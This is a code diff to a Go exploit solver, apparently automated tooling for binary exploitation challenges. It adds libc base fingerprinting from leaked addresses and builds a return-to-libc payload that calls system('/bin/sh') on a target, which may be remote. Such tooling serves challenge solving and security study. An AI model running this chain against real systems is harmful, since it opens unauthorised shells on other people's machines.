@@ -267,6 +267,9 @@ func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
 		s.report.Limitations = append(s.report.Limitations, "could not resolve libc system()/\"/bin/sh\"; ret2libc strategy skipped (for a remote target with a different libc, pass --libc)")
 		return false, nil
 	}
+	// Fingerprint the base against every exported libc symbol rather than
+	// assuming the leak is system(), so a puts/printf/… leak resolves too.
+	syms := s.libcSymbols()
 	for _, off := range leakOffsets() {
 		for _, align := range []bool{true, false} {
 			if align && !haveRet {
@@ -276,17 +279,11 @@ func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
 				return false, err
 			}
 			done, err := s.liveAttempt(ctx, "ret2libc", func(leaks []uint64) ([]byte, string, bool) {
-				var base, system uint64
-				found := false
-				for _, l := range leaks {
-					if (l-sysOff)%0x1000 == 0 { // a page-aligned base confirms this leak is system()
-						base, system, found = l-sysOff, l, true
-						break
-					}
-				}
+				base, found := resolveBaseFromLeaks(leaks, syms)
 				if !found {
 					return nil, "", false
 				}
+				system := base + sysOff
 				binsh := base + binshOff
 				payload := bytes.Repeat([]byte("A"), off)
 				payload = append(payload, qword(popRDI)...)
@@ -305,6 +302,9 @@ func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
 			}
 		}
 	}
+	// Reached only when no base/chain worked. The usual cause is a target libc
+	// that differs from the one offsets were resolved against.
+	s.report.Limitations = append(s.report.Limitations, "ret2libc did not solve: leaked addresses did not resolve against the local libc's symbols; if the target libc differs, pass --libc with the matching libc")
 	return false, nil
 }
 
@@ -334,6 +334,81 @@ func (s *solver) resolveLibcCached() (sysOff, binshOff uint64, ok bool) {
 		Resolved:     ok,
 	}
 	return sysOff, binshOff, ok
+}
+
+// libcPath resolves the libc to analyze: an explicit --libc when given, else the
+// libc the local binary links, found with ldd.
+func libcPath(binPath, libcFlag string) (string, bool) {
+	if libcFlag != "" {
+		return libcFlag, true
+	}
+	out, err := exec.Command("ldd", binPath).Output()
+	if err != nil {
+		return "", false
+	}
+	m := regexp.MustCompile(`(/[^\s]*libc[^\s]*\.so[^\s]*)`).FindSubmatch(out)
+	if m == nil {
+		return "", false
+	}
+	return string(m[1]), true
+}
+
+// libcSymbolOffsets maps exported libc function names to their file offsets, used
+// to fingerprint which symbol a leaked address corresponds to.
+func libcSymbolOffsets(path string) map[string]uint64 {
+	lf, err := elf.Open(path)
+	if err != nil {
+		return nil
+	}
+	defer lf.Close()
+	syms, err := lf.DynamicSymbols()
+	if err != nil {
+		return nil
+	}
+	out := map[string]uint64{}
+	for _, sy := range syms {
+		if elf.ST_TYPE(sy.Info) == elf.STT_FUNC && sy.Value != 0 {
+			out[sy.Name] = sy.Value
+		}
+	}
+	return out
+}
+
+// libcSymbols returns the exported function offsets of the target's libc.
+func (s *solver) libcSymbols() map[string]uint64 {
+	p, ok := libcPath(s.path, s.libc)
+	if !ok {
+		return nil
+	}
+	return libcSymbolOffsets(p)
+}
+
+// resolveBaseFromLeaks fingerprints the libc base from leaked addresses without
+// assuming which symbol leaked. A loaded address shares its low 12 bits (the page
+// offset) with its symbol's file offset, so for each leak it finds every exported
+// symbol whose offset matches those bits and proposes base = leak - offset. The
+// true base is the one the most distinct leaks agree on (random coincidences
+// rarely line up across leaks); ties prefer the smallest base for determinism.
+func resolveBaseFromLeaks(leaks []uint64, syms map[string]uint64) (uint64, bool) {
+	support := map[uint64]map[uint64]bool{} // base -> set of leaks supporting it
+	for _, l := range leaks {
+		for _, off := range syms {
+			if l > off && (l-off)&0xfff == 0 {
+				if support[l-off] == nil {
+					support[l-off] = map[uint64]bool{}
+				}
+				support[l-off][l] = true
+			}
+		}
+	}
+	best, bestN, ok := uint64(0), 0, false
+	for base, set := range support {
+		n := len(set)
+		if n > bestN || (n == bestN && ok && base < best) || (n > 0 && !ok) {
+			best, bestN, ok = base, n, true
+		}
+	}
+	return best, ok
 }
 
 // resolveLibc returns the file offset of system() and of a "/bin/sh" string in
